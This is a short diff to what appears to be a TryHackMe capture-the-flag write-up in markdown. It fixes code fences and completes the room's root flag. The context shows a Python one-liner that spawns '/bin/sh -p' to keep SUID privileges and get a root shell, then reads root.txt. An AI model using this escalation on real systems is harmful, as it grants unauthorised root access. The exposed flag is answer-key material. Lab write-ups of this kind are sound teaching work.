@@ -147,9 +147,6 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 # whoami
 whoami
 root
-```
-
-```
 # ls     
 ls
 bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
@@ -162,7 +159,9 @@ ls
 root.txt
 # cat root.txt
 cat root.txt
-THM{pr1v1l3g3_3sc4l4t10n
+THM{pr1v1l3g3_3sc4l4t10n}
+```
 
+```
 Done and dusted!
 ```
